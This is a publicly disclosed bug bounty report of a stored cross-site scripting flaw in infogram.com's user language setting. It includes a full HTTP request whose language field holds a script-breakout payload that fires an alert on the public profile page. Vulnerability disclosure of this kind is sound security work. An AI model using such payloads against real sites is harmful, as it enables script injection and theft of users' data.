# Stored XSS in infogram.com via language 

## Report Details
- **Report ID**: 430029
- **URL**: https://hackerone.com/reports/430029
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-10-28T21:18:50.797Z
- **Disclosed**: 2019-06-22T07:54:17.827Z

## Reporter
- **Username**: theappsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: infogram

## Vulnerability Information
The stored XSS was found in the language profile parameter.

POC:
Change profile settings with following request:

```http
PUT /api/users/me HTTP/1.1
Host: infogram.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
csrf-token: **your token**
X-Requested-With: XMLHttpRequest
Content-Length: 135
DNT: 1
Connection: close
Cookie: **your cookies**

first_name=name&last_name=name&username=&confirm_password=password&language=></script><img src=x onerror=alert(document.domain)>;//
```
Go to your public profile link.

example: https://infogram.com/dd_ddt7

## Impact

This allows an attacker to inject custom Javascript codes that can be used to steal information from infogram's users.

## Attachments
- Selection_088.png
